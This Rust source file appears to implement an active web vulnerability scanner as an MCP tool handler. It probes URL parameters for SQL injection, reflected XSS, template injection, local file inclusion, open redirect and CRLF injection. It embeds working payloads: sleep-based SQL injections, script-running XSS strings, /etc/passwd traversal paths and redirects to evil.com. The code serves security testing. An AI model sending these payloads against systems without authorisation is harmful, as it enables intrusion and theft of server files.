use super::{next_finding_id, Finding};
use crate::mcp::types::HandlerResult;
use std::collections::HashMap;

pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
    let target = params["target"].as_str().ok_or("target URL is required")?;

    let scan_types: Vec<String> = params["scan_types"]
        .as_array()
        .map(|arr| arr.iter().filter_map(|v| v.as_str().map(String::from)).collect())
        .unwrap_or_else(|| vec!["all".into()]);

    let max_payloads = params["max_payloads_per_type"].as_u64().unwrap_or(25) as usize;
    let max_concurrent = params["max_concurrent"].as_u64().unwrap_or(5) as usize;
    let timeout_secs = params["timeout_secs"].as_u64().unwrap_or(15);

    let scan_all = scan_types.contains(&"all".into());

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(timeout_secs))
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::none()) // Don't follow redirects for active scanning
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 WonderSuite/1.0")
        .build()
        .map_err(|e| format!("Client error: {}", e))?;

    let parsed = url::Url::parse(target).map_err(|e| format!("Invalid URL: {}", e))?;
    let params_list: Vec<(String, String)> =
        parsed.query_pairs().map(|(k, v)| (k.to_string(), v.to_string())).collect();

    let start = std::time::Instant::now();
    let baseline = match client.get(target).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            let time = start.elapsed().as_millis() as u64;
            Baseline { status, body_len: body.len(), body, time_ms: time }
        }
        Err(e) => return Err(format!("Cannot reach target: {}", e)),
    };

    let mut all_findings: Vec<Finding> = Vec::new();
    let mut scan_stats: HashMap<String, ScanTypeStats> = HashMap::new();

    if scan_all || scan_types.iter().any(|s| s == "sqli") {
        let mut stats = ScanTypeStats::default();
        let payloads = load_payloads("sqli", max_payloads);

        for (param_name, param_value) in &params_list {
            for payload in &payloads {
                stats.requests += 1;
                let test_url = replace_param(target, param_name, payload);

                if let Ok(resp) = client.get(&test_url).send().await {
                    let body = resp.text().await.unwrap_or_default();

                    for (pattern, db_type) in SQL_ERROR_PATTERNS {
                        if body.contains(pattern) && !baseline.body.contains(pattern) {
                            stats.findings += 1;
                            all_findings.push(Finding {
                                id: next_finding_id(),
                                finding_type: "sqli_error".into(),
                                name: format!("SQL Injection — {} Error", db_type),
                                severity: "high".into(),
                                confidence: "certain".into(),
                                url: test_url.clone(),
                                parameter: Some(param_name.clone()),
                                payload: Some(payload.clone()),
                                evidence: extract_evidence(&body, pattern, 150),
                                detail: format!("The parameter '{}' appears vulnerable to SQL injection. A {} database error was triggered.", param_name, db_type),
                                remediation: "Use parameterized queries (prepared statements). Never concatenate user input into SQL.".into(),
                                request_info: None,
                            });
                            break;
                        }
                    }
                }
            }

            let time_payloads = [
                ("' OR SLEEP(3)-- -", 3000),
                ("'; WAITFOR DELAY '0:0:3'-- ", 3000),
                ("' OR pg_sleep(3)-- ", 3000),
            ];
            for (payload, expected_delay) in &time_payloads {
                stats.requests += 1;
                let test_url = replace_param(target, param_name, payload);
                let t_start = std::time::Instant::now();
                if let Ok(resp) = client.get(&test_url).send().await {
                    let elapsed = t_start.elapsed().as_millis() as u64;
                    let _ = resp.text().await;
                    if elapsed >= *expected_delay && elapsed < (*expected_delay + 5000) {
                        let verify_payload = payload.replace('3', "0");
                        let verify_url = replace_param(target, param_name, &verify_payload);
                        let v_start = std::time::Instant::now();
                        if let Ok(v_resp) = client.get(&verify_url).send().await {
                            let v_elapsed = v_start.elapsed().as_millis() as u64;
                            let _ = v_resp.text().await;
                            if v_elapsed < 2000 && elapsed > v_elapsed + 2000 {
                                stats.findings += 1;
                                all_findings.push(Finding {
                                    id: next_finding_id(),
                                    finding_type: "sqli_blind_time".into(),
                                    name: "SQL Injection — Time-Based Blind".into(),
                                    severity: "critical".into(),
                                    confidence: "firm".into(),
                                    url: test_url.clone(),
                                    parameter: Some(param_name.clone()),
                                    payload: Some(payload.to_string()),
                                    evidence: format!("Injected sleep caused {}ms delay (baseline: {}ms, verify: {}ms)", elapsed, baseline.time_ms, v_elapsed),
                                    detail: format!("Parameter '{}' is vulnerable to time-based blind SQL injection. The server delayed {}ms when a sleep was injected.", param_name, elapsed),
                                    remediation: "Use parameterized queries. Implement WAF rules.".into(),
                                    request_info: None,
                                });
                            }
                        }
                    }
                }
            }
        }
        scan_stats.insert("sqli".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "xss") {
        let mut stats = ScanTypeStats::default();
        let canary =
            format!("ws{}", uuid::Uuid::new_v4().to_string().replace('-', "").get(..8).unwrap_or("test1234"));

        for (param_name, _) in &params_list {
            stats.requests += 1;
            let test_url = replace_param(target, param_name, &canary);
            if let Ok(resp) = client.get(&test_url).send().await {
                let body = resp.text().await.unwrap_or_default();
                if body.contains(&canary) {
                    let xss_payloads = load_payloads("xss", max_payloads.min(15));
                    let context_payloads = vec![
                        format!("<{0}>", canary),
                        format!("\"><img src=x onerror=alert({})>", canary),
                        format!("'><script>{}</script>", canary),
                        format!("javascript:alert({})", canary),
                        format!("\" onfocus=alert({}) autofocus=\"", canary),
                        format!("<svg/onload=alert({})>", canary),
                    ];

                    let all_xss: Vec<String> =
                        context_payloads.into_iter().chain(xss_payloads.into_iter()).collect();

                    for payload in &all_xss {
                        stats.requests += 1;
                        let test_url = replace_param(target, param_name, payload);
                        if let Ok(resp) = client.get(&test_url).send().await {
                            let resp_body = resp.text().await.unwrap_or_default();

                            if resp_body.contains(payload) {
                                stats.findings += 1;
                                all_findings.push(Finding {
                                    id: next_finding_id(),
                                    finding_type: "xss_reflected".into(),
                                    name: "Cross-Site Scripting (Reflected)".into(),
                                    severity: "high".into(),
                                    confidence: "certain".into(),
                                    url: test_url.clone(),
                                    parameter: Some(param_name.clone()),
                                    payload: Some(payload.clone()),
                                    evidence: extract_evidence(&resp_body, payload, 200),
                                    detail: format!("The parameter '{}' reflects user input without encoding. The XSS payload was found unmodified in the response.", param_name),
                                    remediation: "HTML-encode all user input before rendering. Use Content-Security-Policy.".into(),
                                    request_info: None,
                                });
                                break; // One confirmed XSS per param is enough
                            }

                            if payload.contains('<') && resp_body.contains(&format!("<{}", canary)) {
                                stats.findings += 1;
                                all_findings.push(Finding {
                                    id: next_finding_id(),
                                    finding_type: "xss_potential".into(),
                                    name: "Potential XSS — HTML Tags Reflected".into(),
                                    severity: "medium".into(),
                                    confidence: "firm".into(),
                                    url: test_url.clone(),
                                    parameter: Some(param_name.clone()),
                                    payload: Some(payload.clone()),
                                    evidence: extract_evidence(&resp_body, &format!("<{}", canary), 200),
                                    detail: format!("Parameter '{}' reflects HTML tags. While the exact payload may be filtered, the lack of encoding suggests XSS may be possible with bypass techniques.", param_name),
                                    remediation: "Implement context-aware output encoding.".into(),
                                    request_info: None,
                                });
                                break;
                            }
                        }
                    }
                }
            }
        }
        scan_stats.insert("xss".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "ssti") {
        let mut stats = ScanTypeStats::default();
        let ssti_probes = [
            ("{{7*7}}", "49", "Jinja2/Twig"),
            ("${7*7}", "49", "Freemarker/Velocity"),
            ("<%=7*7%>", "49", "ERB/EJS"),
            ("#{7*7}", "49", "Ruby/Pug"),
            ("{{7*'7'}}", "7777777", "Jinja2 (string multiply)"),
            ("${{7*7}}", "49", "Thymeleaf"),
            ("{7*7}", "49", "Smarty"),
        ];

        for (param_name, _) in &params_list {
            for (payload, expected, engine) in &ssti_probes {
                stats.requests += 1;
                let test_url = replace_param(target, param_name, payload);
                if let Ok(resp) = client.get(&test_url).send().await {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(expected) && !baseline.body.contains(expected) {
                        stats.findings += 1;
                        all_findings.push(Finding {
                            id: next_finding_id(),
                            finding_type: "ssti".into(),
                            name: format!("Server-Side Template Injection ({})", engine),
                            severity: "critical".into(),
                            confidence: "certain".into(),
                            url: test_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: extract_evidence(&body, expected, 150),
                            detail: format!("The template expression '{}' was evaluated server-side, producing '{}'. This indicates {} template injection, which can lead to Remote Code Execution.", payload, expected, engine),
                            remediation: "Never pass user input to template engines. Use sandboxed template rendering.".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
        scan_stats.insert("ssti".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "lfi") {
        let mut stats = ScanTypeStats::default();
        let lfi_payloads = [
            ("../../../../etc/passwd", "root:x:", "Unix /etc/passwd"),
            ("..\\..\\..\\..\\windows\\win.ini", "[fonts]", "Windows win.ini"),
            ("....//....//....//etc/passwd", "root:x:", "Double-dot bypass"),
            ("/etc/passwd%00", "root:x:", "Null byte bypass"),
            ("php://filter/convert.base64-encode/resource=index", "PD", "PHP filter wrapper"),
            ("..%252f..%252f..%252fetc/passwd", "root:x:", "Double URL encode"),
            ("..%c0%af..%c0%af..%c0%afetc/passwd", "root:x:", "Unicode bypass"),
        ];

        for (param_name, _) in &params_list {
            for (payload, indicator, technique) in &lfi_payloads {
                stats.requests += 1;
                let test_url = replace_param(target, param_name, payload);
                if let Ok(resp) = client.get(&test_url).send().await {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(indicator) && !baseline.body.contains(indicator) {
                        stats.findings += 1;
                        all_findings.push(Finding {
                            id: next_finding_id(),
                            finding_type: "lfi".into(),
                            name: format!("Local File Inclusion — {}", technique),
                            severity: "critical".into(),
                            confidence: "certain".into(),
                            url: test_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: extract_evidence(&body, indicator, 200),
                            detail: format!("The parameter '{}' is vulnerable to Local File Inclusion via {}. Sensitive file contents were returned.", param_name, technique),
                            remediation: "Use a whitelist for file paths. Never use user input directly in file operations.".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
        scan_stats.insert("lfi".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "open_redirect") {
        let mut stats = ScanTypeStats::default();
        let redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com%2F%2F",
            "////evil.com",
            "https:evil.com",
        ];

        let redirect_params = [
            "url",
            "redirect",
            "next",
            "return",
            "returnUrl",
            "redirect_uri",
            "continue",
            "dest",
            "destination",
            "go",
            "target",
            "rurl",
            "out",
        ];

        for (param_name, _) in &params_list {
            if redirect_params.iter().any(|rp| param_name.to_lowercase().contains(rp)) {
                for payload in &redirect_payloads {
                    stats.requests += 1;
                    let test_url = replace_param(target, param_name, payload);
                    if let Ok(resp) = client.get(&test_url).send().await {
                        let status = resp.status().as_u16();
                        if (300..400).contains(&status) {
                            if let Some(loc) = resp.headers().get("location") {
                                let loc_str = loc.to_str().unwrap_or("");
                                if loc_str.contains("evil.com") {
                                    stats.findings += 1;
                                    all_findings.push(Finding {
                                        id: next_finding_id(),
                                        finding_type: "open_redirect".into(),
                                        name: "Open Redirect".into(),
                                        severity: "medium".into(),
                                        confidence: "certain".into(),
                                        url: test_url.clone(),
                                        parameter: Some(param_name.clone()),
                                        payload: Some(payload.to_string()),
                                        evidence: format!("Location: {}", loc_str),
                                        detail: format!("The parameter '{}' redirects to an attacker-controlled domain. This can be used for phishing attacks.", param_name),
                                        remediation: "Use a whitelist for redirect targets. Validate URLs server-side.".into(),
                                        request_info: None,
                                    });
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
        scan_stats.insert("open_redirect".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "header_injection") {
        let mut stats = ScanTypeStats::default();
        let crlf_payloads = [
            "%0d%0aX-Injected: true",
            "%0aX-Injected: true",
            "\r\nX-Injected: true",
            "%E5%98%8A%E5%98%8DX-Injected: true",
        ];

        for (param_name, _) in &params_list {
            for payload in &crlf_payloads {
                stats.requests += 1;
                let test_url = replace_param(target, param_name, payload);
                if let Ok(resp) = client.get(&test_url).send().await {
                    let has_injected = resp.headers().contains_key("x-injected");
                    let _ = resp.text().await;
                    if has_injected {
                        stats.findings += 1;
                        all_findings.push(Finding {
                            id: next_finding_id(),
                            finding_type: "crlf_injection".into(),
                            name: "CRLF / Header Injection".into(),
                            severity: "high".into(),
                            confidence: "certain".into(),
                            url: test_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: "Response contains injected header: X-Injected: true".into(),
                            detail: format!("Parameter '{}' is vulnerable to CRLF injection. An attacker can inject arbitrary HTTP headers, potentially leading to XSS, cache poisoning, or session fixation.", param_name),
                            remediation: "Strip or encode CR/LF characters from user input before using in HTTP headers.".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
        scan_stats.insert("header_injection".into(), stats);
    }

    let total_requests: usize = scan_stats.values().map(|s| s.requests).sum();
    let total_findings = all_findings.len();

    let sev_order = |s: &str| -> u8 {
        match s {
            "critical" => 0,
            "high" => 1,
            "medium" => 2,
            "low" => 3,
            _ => 4,
        }
    };
    all_findings.sort_by(|a, b| sev_order(&a.severity).cmp(&sev_order(&b.severity)));

    let mut severity_counts: HashMap<String, usize> = HashMap::new();
    for f in &all_findings {
        *severity_counts.entry(f.severity.clone()).or_insert(0) += 1;
    }

    Ok(serde_json::json!({
        "target": target,
        "baseline": {
            "status": baseline.status,
            "body_length": baseline.body_len,
            "response_time_ms": baseline.time_ms,
        },
        "injection_points": params_list.len(),
        "scan_types": scan_stats.keys().collect::<Vec<_>>(),
        "total_requests": total_requests,
        "total_findings": total_findings,
        "findings_by_severity": severity_counts,
        "scan_stats": scan_stats,
        "findings": all_findings,
    }))
}

struct Baseline {
    status: u16,
    body_len: usize,
    body: String,
    time_ms: u64,
}

#[derive(Debug, Clone, Default, serde::Serialize)]
struct ScanTypeStats {
    requests: usize,
    findings: usize,
}

const SQL_ERROR_PATTERNS: &[(&str, &str)] = &[
    ("You have an error in your SQL syntax", "MySQL"),
    ("mysql_fetch_array()", "MySQL"),
    ("Warning: mysql_", "MySQL"),
    ("MySqlException", "MySQL"),
    ("com.mysql.jdbc", "MySQL"),
    ("pg_query()", "PostgreSQL"),
    ("PSQLException", "PostgreSQL"),
    ("ERROR:  syntax error at or near", "PostgreSQL"),
    ("unterminated quoted string", "PostgreSQL"),
    ("Unclosed quotation mark", "MSSQL"),
    ("Microsoft OLE DB Provider", "MSSQL"),
    ("ODBC SQL Server Driver", "MSSQL"),
    ("SqlException", "MSSQL"),
    ("mssql_query()", "MSSQL"),
    ("ORA-00933", "Oracle"),
    ("ORA-01756", "Oracle"),
    ("ORA-06512", "Oracle"),
    ("quoted string not properly terminated", "Oracle"),
    ("SQLITE_ERROR", "SQLite"),
    ("near \"%s\": syntax error", "SQLite"),
    ("unrecognized token", "SQLite"),
    ("SQL syntax.*?MySQL", "MySQL"),
    ("valid MySQL result", "MySQL"),
    ("SQLSTATE[", "Generic SQL"),
    ("HY000", "Generic SQL"),
];

fn replace_param(url: &str, param_name: &str, new_value: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let pairs: Vec<(String, String)> = parsed
            .query_pairs()
            .map(|(k, v)| {
                if k == param_name {
                    (k.to_string(), new_value.to_string())
                } else {
                    (k.to_string(), v.to_string())
                }
            })
            .collect();
        parsed.query_pairs_mut().clear();
        for (k, v) in &pairs {
            parsed.query_pairs_mut().append_pair(k, v);
        }
        parsed.to_string()
    } else {
        url.to_string()
    }
}

fn load_payloads(category: &str, limit: usize) -> Vec<String> {
    let mut mgr = crate::mcp::handlers::payloads::manager();
    mgr.load(category).unwrap_or_default().into_iter().take(limit).collect()
}

fn extract_evidence(body: &str, needle: &str, context: usize) -> String {
    if let Some(pos) = body.find(needle) {
        let start = pos.saturating_sub(context / 2);
        let end = (pos + needle.len() + context / 2).min(body.len());
        let snippet = &body[start..end];
        format!("...{}...", snippet.replace('\n', "\\n").replace('\r', ""))
    } else {
        format!("Pattern '{}' found in response", needle)
    }
}
